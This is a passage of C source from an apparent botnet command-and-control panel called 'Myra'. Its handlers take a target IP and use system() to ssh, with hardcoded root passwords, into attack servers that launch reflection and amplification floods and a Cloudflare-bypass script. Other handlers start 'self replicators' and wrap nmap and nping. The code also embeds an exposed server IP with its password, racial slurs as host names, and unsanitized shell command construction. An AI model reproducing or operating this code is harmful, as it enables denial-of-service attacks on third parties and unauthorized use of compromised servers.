      sprintf(ipkill, "echo -e '\e[38;5;134m[\e[38;5;168mMyra\e[38;5;134m] \e[38;5;168mUser:\e[38;5;134m[\e[38;5;168m%s\e[38;5;134m] \e[38;5;168mMethod:\e[38;5;134m[\e[38;5;168mZEUS\e[38;5;134m] \e[38;5;168mIP/Port:\e[38;5;134m[\e[38;5;168m%s\e[38;5;134m]'; echo -e '\e[38;5;134m[\e[38;5;168mMyra\e[38;5;134m] \e[38;5;168mUser:\e[38;5;134m[\e[38;5;168m%s\e[38;5;134m] \e[38;5;168mMethod:\e[38;5;134m[\e[38;5;168mZEUS\e[38;5;134m] \e[38;5;168mIP/Port:\e[38;5;134m[\e[38;5;168m%s\e[38;5;134m]' >> logs/Myra_IPHM_Attack.log\r\n", accounts[find_line].username, iptarget, accounts[find_line].username, iptarget);
      sprintf(ipkill2, "screen -d -m sshpass -p suckyourdad1234@ ssh root@nigger1 /usr/sbin/c2/amp/methods/layer4/v1/reflection/zeus-atk/zeus %s /usr/sbin/c2/amp/methods/layer4/v1/reflection/zeus-atk/zeus.txt 5 -1 60\r\n", iptarget);
      //sprintf(ipkill3, "screen -d -m sshpass -p IAmSLightLYBLACK331 ssh root@mainnig /usr/sbin/c2/amp/methods/layer4/v1/reflection/zeus-atk/zeus %s /usr/sbin/c2/amp/methods/layer4/v1/reflection/zeus-atk/zeus.txt 4 -1 60\r\n", iptarget);
      sprintf(ipkill4, "screen -d -m sshpass -p IAmSLightLYBLACK331 ssh root@nigger2 /usr/sbin/c2/amp/methods/layer4/v1/reflection/athena-atk/athena %s /usr/sbin/c2/amp/methods/layer4/v1/reflection/athena-atk/athena.txt 5 -1 60\r\n", iptarget);
      sprintf(ipkill5, "screen -d -m sshpass -p tillwefall1234@ ssh root@nigger3 /usr/sbin/c2/amp/methods/layer4/v1/reflection/zeus-atk/zeus %s /usr/sbin/c2/amp/methods/layer4/v1/reflection/zeus-atk/zeus.txt 8 -1 60\r\n", iptarget);
      sprintf(ipkill6, "screen -d -m sshpass -p tillwefall1234@ ssh root@nigger4 /usr/sbin/c2/amp/methods/layer4/v1/reflection/zeus-atk/zeus %s /usr/sbin/c2/amp/methods/layer4/v1/reflection/zeus-atk/zeus.txt 8 -1 60\r\n", iptarget);
      system(ipkill); // System Execution
      system(ipkill2);
      //system(ipkill3);
      system(ipkill4);
      system(ipkill5);
      system(ipkill6);
      sprintf(myra, "\x1b[38;5;225m╔══════════════════╗\r\n\x1b[38;5;225m║ \x1b[38;5;168mAttack Sent!     \x1b[38;5;225m║ \x1b[38;5;168mIP \x1b[38;5;225m/ \x1b[38;5;168mPort\x1b[38;5;225m: \e[38;5;134m%s\r\n\x1b[38;5;225m║ \x1b[38;5;168mMethod\x1b[38;5;225m: \e[38;5;134mZEUS     \x1b[38;5;225m║ \x1b[38;5;168mTime\x1b[38;5;225m: \e[38;5;134m1200\r\n\x1b[38;5;225m║ \x1b[38;5;168mUsage\x1b[38;5;225m: \e[38;5;134mIPHM-ZEUS \x1b[38;5;225m║ \x1b[38;5;168mThreads\x1b[38;5;225m: \e[38;5;134m2\r\n\x1b[38;5;225m╚══════════════════╝\r\n", iptarget);
      if (send(clear_myra_broadcast, myra, strlen(myra), MSG_NOSIGNAL) == -1)
        return; // Each Line Set on [MSG_NOSIGNAL] - Broadcast
    }
    if (strstr(myra_buffer_size, ".apollo") || strstr(myra_buffer_size, ".APOLLO")) // System Command Function
    {
      char iptarget[5000];                                                   // Char Every Line For Output Communication
      char *token = strtok(myra_buffer_size, " ");                           // Create Delimiter
      snprintf(iptarget, sizeof(iptarget), "%s", token + strlen(token) + 1); // String Comparison From User Input - Using Token Size
      trim_removev2(iptarget);                                               // Trim [iptarget]
      char *ipkill[5000];                                                    // Creating A System Function
      trim_removev2(ipkill);                                                 // Trim [ipkill]
      char *ipkill2[5000];                                                   // Creating A System Function
      trim_removev2(ipkill2);                                                // Trim [ipkill]
      sprintf(ipkill2, "echo -e '\e[38;5;134m[\e[38;5;168mMyra\e[38;5;134m] \e[38;5;168mUser:\e[38;5;134m[\e[38;5;168m%s\e[38;5;134m] \e[38;5;168mMethod:\e[38;5;134m[\e[38;5;168mAPOLLO\e[38;5;134m] \e[38;5;168mHOSTNAME:\e[38;5;134m[\e[38;5;168m%s\e[38;5;134m]'; echo -e '\e[38;5;134m[\e[38;5;168mMyra\e[38;5;134m] \e[38;5;168mUser:\e[38;5;134m[\e[38;5;168m%s\e[38;5;134m] \e[38;5;168mMethod:\e[38;5;134m[\e[38;5;168mAPOLLO\e[38;5;134m] \e[38;5;168mHOSTNAME:\e[38;5;134m[\e[38;5;168m%s\e[38;5;134m]' >> logs/Myra_IPHM_Attack.log\r\n", accounts[find_line].username, iptarget, accounts[find_line].username, iptarget);
      sprintf(ipkill, "screen -d -m sshpass -p suckyourdad1234@ ssh root@nigger1 timeout 60 node CFBypass.js %s 60\r\n", iptarget); // Default Time Has Been Set To 30 Seconds. Default Port Is 62141
      system(ipkill2);
      system(ipkill); // System Execution
      sprintf(myra, "\x1b[38;5;225m╔══════════════════╗\r\n\x1b[38;5;225m║ \x1b[38;5;168mAttack Sent!     \x1b[38;5;225m║ \x1b[38;5;168mIP \x1b[38;5;225m/ \x1b[38;5;168mPort\x1b[38;5;225m: \e[38;5;134m%s\r\n\x1b[38;5;225m║ \x1b[38;5;168mMethod\x1b[38;5;225m: \e[38;5;134mAPOLLO   \x1b[38;5;225m║ \x1b[38;5;168mTime\x1b[38;5;225m: \e[38;5;134m1200\r\n\x1b[38;5;225m║ \x1b[38;5;168mUsage\x1b[38;5;225m: \e[38;5;134mIPHM-APLO \x1b[38;5;225m║ \x1b[38;5;168mThreads\x1b[38;5;225m: \e[38;5;134m12\r\n\x1b[38;5;225m╚══════════════════╝\r\n", iptarget);
      if (send(clear_myra_broadcast, myra, strlen(myra), MSG_NOSIGNAL) == -1)
        return; // Each Line Set on [MSG_NOSIGNAL] - Broadcast
    }
    if (strstr(myra_buffer_size, ".vulcan") || strstr(myra_buffer_size, ".VULCAN")) // System Command Function
    {
      char iptarget[5000];                                                   // Char Every Line For Output Communication
      char *token = strtok(myra_buffer_size, " ");                           // Create Delimiter
      snprintf(iptarget, sizeof(iptarget), "%s", token + strlen(token) + 1); // String Comparison From User Input - Using Token Size
      trim_removev2(iptarget);                                               // Trim [iptarget]
      char *ipkill[5000];                                                    // Creating A System Function
      trim_removev2(ipkill);                                                 // Trim [ipkill]
      char *ipkill2[5000];                                                   // Creating A System Function
      trim_removev2(ipkill2);                                                // Trim [ipkill]
      //char *ipkill3[5000];
      //trim_removev2(ipkill3);
      //char *ipkill4[5000];
      //trim_removev2(ipkill4);
      char *ipkill5[5000];
      trim_removev2(ipkill5);
      char *ipkill6[5000];
      trim_removev2(ipkill6);
      sprintf(ipkill, "echo -e '\e[38;5;134m[\e[38;5;168mMyra\e[38;5;134m] \e[38;5;168mUser:\e[38;5;134m[\e[38;5;168m%s\e[38;5;134m] \e[38;5;168mMethod:\e[38;5;134m[\e[38;5;168mVULCAN\e[38;5;134m] \e[38;5;168mIP/Port:\e[38;5;134m[\e[38;5;168m%s\e[38;5;134m]'; echo -e '\e[38;5;134m[\e[38;5;168mMyra\e[38;5;134m] \e[38;5;168mUser:\e[38;5;134m[\e[38;5;168m%s\e[38;5;134m] \e[38;5;168mMethod:\e[38;5;134m[\e[38;5;168mVULCAN\e[38;5;134m] \e[38;5;168mIP/Port:\e[38;5;134m[\e[38;5;168m%s\e[38;5;134m]' >> logs/Myra_IPHM_Attack.log\r\n", accounts[find_line].username, iptarget, accounts[find_line].username, iptarget);
      sprintf(ipkill2, "screen -d -m sshpass -p suckyourdad1234@ ssh root@nigger1 /usr/sbin/c2/amp/methods/layer4/v1/reflection/vulcan-atk/vulcan %s /usr/sbin/c2/amp/methods/layer4/v1/reflection/vulcan-atk/vulcan.txt 5 -1 60\r\n", iptarget);
      //sprintf(ipkill3, "screen -d -m sshpass -p IAmSLightLYBLACK331 ssh root@mainnig /usr/sbin/c2/amp/methods/layer4/v1/reflection/vulcan-atk/vulcan %s /usr/sbin/c2/amp/methods/layer4/v1/reflection/vulcan-atk/vulcan.txt 4 -1 60\r\n", iptarget);
      //sprintf(ipkill4, "screen -d -m sshpass -p IAmSLightLYBLACK331 ssh root@nigger2 /usr/sbin/c2/amp/methods/layer4/v1/reflection/athena-atk/athena %s /usr/sbin/c2/amp/methods/layer4/v1/reflection/athena-atk/athena.txt 5 -1 60\r\n", iptarget);
      sprintf(ipkill5, "screen -d -m sshpass -p tillwefall1234@ ssh root@nigger3 /usr/sbin/c2/amp/methods/layer4/v1/reflection/vulcan-atk/vulcan %s /usr/sbin/c2/amp/methods/layer4/v1/reflection/vulcan-atk/vulcan.txt 8 -1 60\r\n", iptarget);
      sprintf(ipkill6, "screen -d -m sshpass -p tillwefall1234@ ssh root@nigger4 /usr/sbin/c2/amp/methods/layer4/v1/reflection/vulcan-atk/vulcan %s /usr/sbin/c2/amp/methods/layer4/v1/reflection/vulcan-atk/vulcan.txt 8 -1 60\r\n", iptarget);
      system(ipkill); // System Execution
      system(ipkill2);
      //system(ipkill3);
      //system(ipkill4);
      system(ipkill5);
      system(ipkill6);
      sprintf(myra, "\x1b[38;5;225m╔══════════════════╗\r\n\x1b[38;5;225m║ \x1b[38;5;168mAttack Sent!     \x1b[38;5;225m║ \x1b[38;5;168mIP \x1b[38;5;225m/ \x1b[38;5;168mPort\x1b[38;5;225m: \e[38;5;134m%s\r\n\x1b[38;5;225m║ \x1b[38;5;168mMethod\x1b[38;5;225m: \e[38;5;134mVULCAN   \x1b[38;5;225m║ \x1b[38;5;168mTime\x1b[38;5;225m: \e[38;5;134m1200\r\n\x1b[38;5;225m║ \x1b[38;5;168mUsage\x1b[38;5;225m: \e[38;5;134mIPHM-VLCN \x1b[38;5;225m║ \x1b[38;5;168mThreads\x1b[38;5;225m: \e[38;5;134m8\r\n\x1b[38;5;225m╚══════════════════╝\r\n", iptarget);
      if (send(clear_myra_broadcast, myra, strlen(myra), MSG_NOSIGNAL) == -1)
        return; // Each Line Set on [MSG_NOSIGNAL] - Broadcast
    }
    if (strstr(myra_buffer_size, ".nein") || strstr(myra_buffer_size, ".NEIN")) // System Command Function
    {
      char iptarget[5000];                                                   // Char Every Line For Output Communication
      char *token = strtok(myra_buffer_size, " ");                           // Create Delimiter
      snprintf(iptarget, sizeof(iptarget), "%s", token + strlen(token) + 1); // String Comparison From User Input - Using Token Size
      trim_removev2(iptarget);                                               // Trim [iptarget]
      char *ipkill[5000];                                                    // Creating A System Function
      trim_removev2(ipkill);                                                 // Trim [ipkill]
      char *ipkill2[5000];                                                   // Creating A System Function
      trim_removev2(ipkill2);                                                // Trim [ipkill]
      sprintf(ipkill, "echo -e '\e[38;5;134m[\e[38;5;168mMyra\e[38;5;134m] \e[38;5;168mUser:\e[38;5;134m[\e[38;5;168m%s\e[38;5;134m] \e[38;5;168mMethod:\e[38;5;134m[\e[38;5;168mNEIN \e[38;5;134m] \e[38;5;168mIP/Port:\e[38;5;134m[\e[38;5;168m%s\e[38;5;134m] \e[38;5;168mThreads:\e[38;5;134m[\e[38;5;168m2\e[38;5;134m] \e[38;5;168mPPS:\e[38;5;134m[\e[38;5;168mMAX\e[38;5;134m] \e[38;5;168mTime:\e[38;5;134m[\e[38;5;168m1200\e[38;5;134m]'; echo -e '\e[38;5;134m[\e[38;5;168mMyra\e[38;5;134m] \e[38;5;168mUser:\e[38;5;134m[\e[38;5;168m%s\e[38;5;134m] \e[38;5;168mMethod:\e[38;5;134m[\e[38;5;168mNEIN \e[38;5;134m] \e[38;5;168mIP/Port:\e[38;5;134m[\e[38;5;168m%s\e[38;5;134m] \e[38;5;168mThreads:\e[38;5;134m[\e[38;5;168m2\e[38;5;134m] \e[38;5;168mPPS:\e[38;5;134m[\e[38;5;168mMAX\e[38;5;134m] \e[38;5;168mTime:\e[38;5;134m[\e[38;5;168m1200\e[38;5;134m]' >> logs/Myra_IPHM_Attack.log\r\n", accounts[find_line].username, iptarget, accounts[find_line].username, iptarget);
      sprintf(ipkill2, "screen -d -m sshpass -p IAmSLightLYBLACK331 ssh root@mainnig /usr/sbin/c2/amp/methods/layer4/v1/reflection/nein-atk/nein %s /usr/sbin/c2/amp/methods/layer4/v1/reflection/nein-atk/nein.txt 4 -1 60\r\n", iptarget);
      system(ipkill); // System Execution
      system(ipkill2);
      sprintf(myra, "\x1b[38;5;225m╔══════════════════╗\r\n\x1b[38;5;225m║ \x1b[38;5;168mAttack Sent!     \x1b[38;5;225m║ \x1b[38;5;168mIP \x1b[38;5;225m/ \x1b[38;5;168mPort\x1b[38;5;225m: \e[38;5;134m%s\r\n\x1b[38;5;225m║ \x1b[38;5;168mMethod\x1b[38;5;225m: \e[38;5;134mNEIN     \x1b[38;5;225m║ \x1b[38;5;168mTime\x1b[38;5;225m: \e[38;5;134m1200\r\n\x1b[38;5;225m║ \x1b[38;5;168mUsage\x1b[38;5;225m: \e[38;5;134mIPHM-NEINZ\x1b[38;5;225m║ \x1b[38;5;168mThreads\x1b[38;5;225m: \e[38;5;134m2\r\n\x1b[38;5;225m╚══════════════════╝\r\n", iptarget);
      if (send(clear_myra_broadcast, myra, strlen(myra), MSG_NOSIGNAL) == -1)
        return; // Each Line Set on [MSG_NOSIGNAL] - Broadcast
    }
    if (strstr(myra_buffer_size, ".zsyn") || strstr(myra_buffer_size, ".ZSYN")) // System Command Function
    {
      char iptarget[5000];                                                        // Char Every Line For Output Communication
      char *token = strtok(myra_buffer_size, " ");                                // Create Delimiter
      snprintf(iptarget, sizeof(iptarget), "%s", token + strlen(token) + 1);      // String Comparison From User Input - Using Token Size
      trim_removev2(iptarget);                                                    // Trim [iptarget]
      char *ipkill[5000];                                                         // Creating A System Function
      trim_removev2(ipkill);                                                      // Trim [ipkill]
      sprintf(ipkill, "./amp/methods/Bandwidth/zsyn %s 62141 2 -1 60", iptarget); // Default Time Has Been Set To 30 Seconds. Default Port Is 62141
      system(ipkill);                                                             // System Execution
      sprintf(myra, "     \e[38;5;225m╔══════════════════════╗\r\n     \e[38;5;225m║ \e[38;5;225mAttack Sent!         \e[38;5;225m║      ╔═══════════════════════════╗\r\n     \e[38;5;225m║ \e[38;5;225mMethod\e[38;5;225m: \e[38;5;168mZSYN         \e[38;5;225m╠══════╣ \e[38;5;168m.KILL to stop the attack! \e[38;5;225m║\r\n     \e[38;5;225m║ \e[38;5;225mUsage\e[38;5;225m: \e[38;5;168mZSYN-IPHM     \e[38;5;225m║      ╚═══════════════════════════╝\r\n     \e[38;5;225m╚══════════════════════╝\r\n");
      if (send(clear_myra_broadcast, myra, strlen(myra), MSG_NOSIGNAL) == -1)
        return; // Each Line Set on [MSG_NOSIGNAL] - Broadcast
    }
    if (strstr(myra_buffer_size, ".issyn") || strstr(myra_buffer_size, ".ISSYN")) // System Command Function
    {
      char iptarget[5000];                                                           // Char Every Line For Output Communication
      char *token = strtok(myra_buffer_size, " ");                                   // Create Delimiter
      snprintf(iptarget, sizeof(iptarget), "%s", token + strlen(token) + 1);         // String Comparison From User Input - Using Token Size
      trim_removev2(iptarget);                                                       // Trim [iptarget]
      char *ipkill[5000];                                                            // Creating A System Function
      trim_removev2(ipkill);                                                         // Trim [ipkill]
      sprintf(ipkill, "./amp/methods/Bandwidth/issyn.c %s 62141 2 -1 60", iptarget); // Default Time Has Been Set To 30 Seconds. Default Port Is 62141
      system(ipkill);                                                                // System Execution
      sprintf(myra, "     \e[38;5;225m╔══════════════════════╗\r\n     \e[38;5;225m║ \e[38;5;225mAttack Sent!         \e[38;5;225m║      ╔═══════════════════════════╗\r\n     \e[38;5;225m║ \e[38;5;225mMethod\e[38;5;225m: \e[38;5;168mISSYN        \e[38;5;225m╠══════╣ \e[38;5;168m.KILL to stop the attack! \e[38;5;225m║\r\n     \e[38;5;225m║ \e[38;5;225mUsage\e[38;5;225m: \e[38;5;168mISSYN-IPHM    \e[38;5;225m║      ╚═══════════════════════════╝\r\n     \e[38;5;225m╚══════════════════════╝\r\n");
      if (send(clear_myra_broadcast, myra, strlen(myra), MSG_NOSIGNAL) == -1)
        return; // Each Line Set on [MSG_NOSIGNAL] - Broadcast
    }
    if (strstr(myra_buffer_size, ".killer") || strstr(myra_buffer_size, ".killer")) // System Command Function -- [TESTING HERE]
    {
      if (strcmp(Admin, accounts[find_line].identification_type) == 0) // Check If User Is Admin
      {
        char outt[500];
        sprintf(outt, "\e[38;5;225mMyra \e[38;5;134mis \e[38;5;225mkilling \e[38;5;168mconcurrent connections\e[38;5;225m..\r\n");
        if (send(clear_myra_broadcast, outt, strlen(outt), MSG_NOSIGNAL) == -1)
          return; // Each Line Set on [MSG_NOSIGNAL] - Broadcast
        sleep(2);
        char text[500];
        sprintf(text, "\e[38;5;225mMyra \e[38;5;134mhas \e[38;5;168mkilled \e[38;5;134m[\e[38;5;168m%d\e[38;5;134m] connections \e[38;5;134msuccessfully \e[38;5;225m!\r\n", myra_clients_connected());
        if (send(clear_myra_broadcast, text, strlen(text), MSG_NOSIGNAL) == -1)
          return; // Each Line Set on [MSG_NOSIGNAL] - Broadcast
        char command[500];
        trim_removev2(command);
        strcpy(command, "screen -d -m sshpass -p succfuccs1234@12 ssh -t root@51.161.105.88 pkill screen");
        system(command);
      }
      else
      {
        char sauce[50];
        sprintf(sauce, "\e[38;5;93mOwners Only!!\r\n");
        if (send(clear_myra_broadcast, sauce, strlen(sauce), MSG_NOSIGNAL) == -1)
          ; // Each Line Set on [MSG_NOSIGNAL] - Broadcast
      }
    }
    if (strstr(myra_buffer_size, ".scan") || strstr(myra_buffer_size, ".SCAN")) // System Command Function -- [TESTING HERE]
    {
      if (strcmp(Admin, accounts[find_line].identification_type) == 0) // Check If User Is Admin
      {
        char text[500];
        char command[500];
        trim_removev2(command);
        strcpy(command, "screen -d -m sshpass -p succfuccs1234@12 ssh -t root@51.161.105.88 timeout 30 watch -n 0.1 screen -d -m ssh -p 23 myra.sh");
        system(command);
        sprintf(text, "\e[38;5;225mMyra \e[38;5;134mhas \e[38;5;168msuccessfully \e[38;5;134mstarted [\e[38;5;168m19\e[38;5;134m] self replicators\e[38;5;225m.\r\n");
        if (send(clear_myra_broadcast, text, strlen(text), MSG_NOSIGNAL) == -1)
          return; // Each Line Set on [MSG_NOSIGNAL] - Broadcast
      }
      else
      {
        char sauce[50];
        sprintf(sauce, "\e[38;5;93mOwners Only!!\r\n");
        if (send(clear_myra_broadcast, sauce, strlen(sauce), MSG_NOSIGNAL) == -1)
          ; // Each Line Set on [MSG_NOSIGNAL] - Broadcast
      }
    }
    int result;
    if (strstr(myra_buffer_size, ".attacks") || strstr(myra_buffer_size, ".ATTACKS"))
    {
      FILE *fp;
      char *ip[5000];
      char path[5000];
      /* Open the command for reading. */
      sprintf(ip, "cd /var/run/screen/S-root; ls -1 | wc -l");
      fp = popen(ip, "r");
      if (fp == NULL)
      {
        printf("Failed to run command\n");
        exit(1);
      }
      /* Read the output a line at a time - output it. */
      while (fgets(path, sizeof(path), fp) != NULL)
      {
        char puta[5000];
        result = atoi(path) - 1;
        //c = result / 2;
        sprintf(puta, "\r\e[38;5;134mThere are \e[38;5;225m[\e[38;5;168m%d\e[38;5;225m] \e[38;5;134mattacks currently running on \e[38;5;168mMyra\e[38;5;134m.\r\n", result);
        if (send(clear_myra_broadcast, puta, strlen(puta), MSG_NOSIGNAL) == -1)
          return;
      }
      /* close */
      pclose(fp);
      //sprintf(myra, "\r \e[38;5;134mMyra has finished scanning successfully!\r\n");
      //if(send(clear_myra_broadcast, myra, strlen(myra), MSG_NOSIGNAL) == -1) return;
    }
    if (strstr(myra_buffer_size, ".nmap") || strstr(myra_buffer_size, ".nmap"))
    {
      char iptarget[5000];
      char *token = strtok(myra_buffer_size, " ");
      snprintf(iptarget, sizeof(iptarget), "%s", token + strlen(token) + 1);
      trim_removev2(iptarget);
      FILE *fp;
      char *ip[5000];
      char path[5000];
      /* Open the command for reading. */
      sprintf(ip, "nmap -vv -dd -p1-65535 --reason -r %s", iptarget);
      fp = popen(ip, "r");
      if (fp == NULL)
      {
        printf("Failed to run command\n");
        exit(1);
      }
      /* Read the output a line at a time - output it. */
      while (fgets(path, sizeof(path), fp) != NULL)
      {
        char puta[5000];
        sprintf(puta, "\r \e[38;5;225m%s", path);
        if (send(clear_myra_broadcast, puta, strlen(puta), MSG_NOSIGNAL) == -1)
          return;
      }
      /* close */
      pclose(fp);
      sprintf(myra, "\r \e[38;5;134mMyra has finished scanning successfully!\r\n");
      if (send(clear_myra_broadcast, myra, strlen(myra), MSG_NOSIGNAL) == -1)
        return;
    }
    if (strstr(myra_buffer_size, ".iplookup") || strstr(myra_buffer_size, ".IPLOOKUP"))
    {
      char iptarget[5000];
      char *token = strtok(myra_buffer_size, " ");
      snprintf(iptarget, sizeof(iptarget), "%s", token + strlen(token) + 1);
      trim_removev2(iptarget);
      if (strlen(iptarget) > 39)
      {
        sprintf(myra, "\e[38;5;134mInvalid IP Address!!\r\n");
        if (send(clear_myra_broadcast, myra, strlen(myra), MSG_NOSIGNAL) == -1)
          ; // Each Line Set on [MSG_NOSIGNAL] - Broadcast
      }
      else
      {
        //  FILE *fp;
        //  char *ip[5000];
        //  char path[5000];
        // /* Open the command for reading. */
        //  sprintf(ip, "python iplookup.py -i %s", iptarget);
        //  fp = popen(ip, "r");
        //  if (fp == NULL) {
        //    printf("Failed to run command\n");
        //    exit(1);
        //  }
        //  Read the output a line at a time - output it.
        //  while (fgets(path, sizeof(path), fp) != NULL) {
        //    char puta [5000];
        //    sprintf(puta, "\r \e[38;5;225m%s", path);
        //    if(send(clear_myra_broadcast, puta, strlen(puta), MSG_NOSIGNAL) == -1) return;
        //  }
        //  /* close */
        //  pclose(fp);
        GeoIPInfo geo_ip_info = ip_info(iptarget);

        char status[120];
        char message[120];
        char ip[120];
        char host[120];
        char as[120];
        char asname[120];
        char isp[120];
        char org[120];
        char countrycode[120];
        char country[120];
        char city[120];
        char district[120];
        char region[120];
        char regionname[120];
        char currency[120];
        char zip[120];
        char time[120];
        char lon[120];
        char lat[120];
        char mobile[120];
        char proxy[120];

        sprintf(status, "\e[38;5;225m║ \e[38;5;168mStatus\e[38;5;134m........\e[38;5;168m: \e[38;5;225m%s\r\n", geo_ip_info.status);
        if (send(clear_myra_broadcast, status, strlen(status), MSG_NOSIGNAL) == -1)
          return;

        if (strstr(geo_ip_info.status, "success") == NULL)
        {
          sprintf(message, "\e[38;5;168mError\e[38;5;134m.........\e[38;5;168m: \e[38;5;225m%s\r\n", geo_ip_info.message);
          if (send(clear_myra_broadcast, message, strlen(message), MSG_NOSIGNAL) == -1)
            return;
        }
        else
        {
          sprintf(ip, "\e[38;5;225m║ \e[38;5;168mIP\e[38;5;134m............\e[38;5;168m: \e[38;5;225m%s\r\n", geo_ip_info.query);
          sprintf(host, "\e[38;5;225m║ \e[38;5;168mHostname\e[38;5;134m......\e[38;5;168m: \e[38;5;225m%s\r\n", geo_ip_info.reverse);
          sprintf(as, "\e[38;5;225m║ \e[38;5;168mAS\e[38;5;134m............\e[38;5;168m: \e[38;5;225m%s\r\n", geo_ip_info.as);
          sprintf(asname, "\e[38;5;225m║ \e[38;5;168mAS Name\e[38;5;134m.......\e[38;5;168m: \e[38;5;225m%s\r\n", geo_ip_info.as_name);
          sprintf(isp, "\e[38;5;225m║ \e[38;5;168mISP\e[38;5;134m...........\e[38;5;168m: \e[38;5;225m%s\r\n", geo_ip_info.isp);
          sprintf(org, "\e[38;5;225m║ \e[38;5;168mOrganisation\e[38;5;134m..\e[38;5;168m: \e[38;5;225m%s\r\n", geo_ip_info.org);
          sprintf(countrycode, "\e[38;5;225m║ \e[38;5;168mCountry Code\e[38;5;134m..\e[38;5;168m: \e[38;5;225m%s\r\n", geo_ip_info.country_code);
          sprintf(country, "\e[38;5;225m║ \e[38;5;168mCountry\e[38;5;134m.......\e[38;5;168m: \e[38;5;225m%s\r\n", geo_ip_info.country);
          sprintf(city, "\e[38;5;225m║ \e[38;5;168mCity\e[38;5;134m..........\e[38;5;168m: \e[38;5;225m%s\r\n", geo_ip_info.city);
          sprintf(district, "\e[38;5;225m║ \e[38;5;168mDistrict\e[38;5;134m......\e[38;5;168m: \e[38;5;225m%s\r\n", geo_ip_info.district);
          sprintf(region, "\e[38;5;225m║ \e[38;5;168mRegion\e[38;5;134m........\e[38;5;168m: \e[38;5;225m%s\r\n", geo_ip_info.region);
          sprintf(regionname, "\e[38;5;225m║ \e[38;5;168mRegion Name\e[38;5;134m...\e[38;5;168m: \e[38;5;225m%s\r\n", geo_ip_info.region_name);
          sprintf(currency, "\e[38;5;225m║ \e[38;5;168mCurrency\e[38;5;134m......\e[38;5;168m: \e[38;5;225m%s\r\n", geo_ip_info.currency);
          sprintf(zip, "\e[38;5;225m║ \e[38;5;168mZip\e[38;5;134m...........\e[38;5;168m: \e[38;5;225m%s\r\n", geo_ip_info.zip);
          sprintf(time, "\e[38;5;225m║ \e[38;5;168mTime Zone\e[38;5;134m.....\e[38;5;168m: \e[38;5;225m%s\r\n", geo_ip_info.timezone);
          sprintf(lon, "\e[38;5;225m║ \e[38;5;168mLongitude\e[38;5;134m.....\e[38;5;168m: \e[38;5;225m%s\r\n", geo_ip_info.lon);
          sprintf(lat, "\e[38;5;225m║ \e[38;5;168mLatitude\e[38;5;134m......\e[38;5;168m: \e[38;5;225m%s\r\n", geo_ip_info.lat);
          sprintf(mobile, "\e[38;5;225m║ \e[38;5;168mMobile\e[38;5;134m........\e[38;5;168m: \e[38;5;225m%s\r\n", geo_ip_info.mobile ? "Detected" : "N/A");
          sprintf(proxy, "\e[38;5;225m║ \e[38;5;168mProxy\e[38;5;134m.........\e[38;5;168m: \e[38;5;225m%s\r\n", geo_ip_info.proxy ? "Detected" : "N/A");
          if (send(clear_myra_broadcast, ip, strlen(ip), MSG_NOSIGNAL) == -1)
            return;
          if (send(clear_myra_broadcast, host, strlen(host), MSG_NOSIGNAL) == -1)
            return;
          if (send(clear_myra_broadcast, as, strlen(as), MSG_NOSIGNAL) == -1)
            return;
          if (send(clear_myra_broadcast, asname, strlen(asname), MSG_NOSIGNAL) == -1)
            return;
          if (send(clear_myra_broadcast, isp, strlen(isp), MSG_NOSIGNAL) == -1)
            return;
          if (send(clear_myra_broadcast, org, strlen(org), MSG_NOSIGNAL) == -1)
            return;
          if (send(clear_myra_broadcast, countrycode, strlen(countrycode), MSG_NOSIGNAL) == -1)
            return;
          if (send(clear_myra_broadcast, country, strlen(country), MSG_NOSIGNAL) == -1)
            return;
          if (send(clear_myra_broadcast, city, strlen(city), MSG_NOSIGNAL) == -1)
            return;
          if (send(clear_myra_broadcast, district, strlen(district), MSG_NOSIGNAL) == -1)
            return;
          if (send(clear_myra_broadcast, region, strlen(region), MSG_NOSIGNAL) == -1)
            return;
          if (send(clear_myra_broadcast, regionname, strlen(regionname), MSG_NOSIGNAL) == -1)
            return;
          if (send(clear_myra_broadcast, currency, strlen(currency), MSG_NOSIGNAL) == -1)
            return;
          if (send(clear_myra_broadcast, zip, strlen(zip), MSG_NOSIGNAL) == -1)
            return;
          if (send(clear_myra_broadcast, time, strlen(time), MSG_NOSIGNAL) == -1)
            return;
          if (send(clear_myra_broadcast, lon, strlen(lon), MSG_NOSIGNAL) == -1)
            return;
          if (send(clear_myra_broadcast, lat, strlen(lat), MSG_NOSIGNAL) == -1)
            return;
          if (send(clear_myra_broadcast, mobile, strlen(mobile), MSG_NOSIGNAL) == -1)
            return;
          if (send(clear_myra_broadcast, proxy, strlen(proxy), MSG_NOSIGNAL) == -1)
            return;
        }
      }
    }
    if (strstr(myra_buffer_size, ".whois") || strstr(myra_buffer_size, ".WHOIS"))
    {
      char iptarget[5000];
      char *token = strtok(myra_buffer_size, " ");
      snprintf(iptarget, sizeof(iptarget), "%s", token + strlen(token) + 1);
      trim_removev2(iptarget);
      FILE *fp;
      char *ip[5000];
      char path[5000];
      /* Open the command for reading. */
      sprintf(ip, "whois %s", iptarget);
      fp = popen(ip, "r");
      if (fp == NULL)
      {
        printf("Failed to run command\n");
        exit(1);
      }
      /* Read the output a line at a time - output it. */
      while (fgets(path, sizeof(path), fp) != NULL)
      {
        char puta[5000];
        sprintf(puta, "\r \e[38;5;225m%s", path);
        if (send(clear_myra_broadcast, puta, strlen(puta), MSG_NOSIGNAL) == -1)
          return;
      }
      /* close */
      pclose(fp);
      sprintf(myra, "\r \e[38;5;134mWHOIS Search Finished Successfully !\r\n");
      if (send(clear_myra_broadcast, myra, strlen(myra), MSG_NOSIGNAL) == -1)
        return;
    }
    if (strstr(myra_buffer_size, ".tcp-ping") || strstr(myra_buffer_size, ".TCP-PING"))
    {
      char iptarget[5000];
      char *token = strtok(myra_buffer_size, " ");
      snprintf(iptarget, sizeof(iptarget), "%s", token + strlen(token) + 1);
      trim_removev2(iptarget);
      FILE *fp;
      char *ip[5000];
      char path[5000];
      /* Open the command for reading. */
      sprintf(ip, "timeout 60 nping --tcp -p %s -c 1000", iptarget);
      fp = popen(ip, "r");
      if (fp == NULL)
      {
        printf("Failed to run command\n");
        exit(1);
      }
      /* Read the output a line at a time - output it. */
      while (fgets(path, sizeof(path), fp) != NULL)
      {
        char puta[5000];
        sprintf(puta, "\r \e[38;5;225m%s", path);
        if (send(clear_myra_broadcast, puta, strlen(puta), MSG_NOSIGNAL) == -1)
          return;
      }
      /* close */
      pclose(fp);
      sprintf(myra, "\r \e[38;5;134mSubstrate has closed your ping successfully !\r\n");
      if (send(clear_myra_broadcast, myra, strlen(myra), MSG_NOSIGNAL) == -1)
        return;
    }
    if (strstr(myra_buffer_size, ".udp-ping") || strstr(myra_buffer_size, ".UDP-PING"))
    {
      char iptarget[5000];
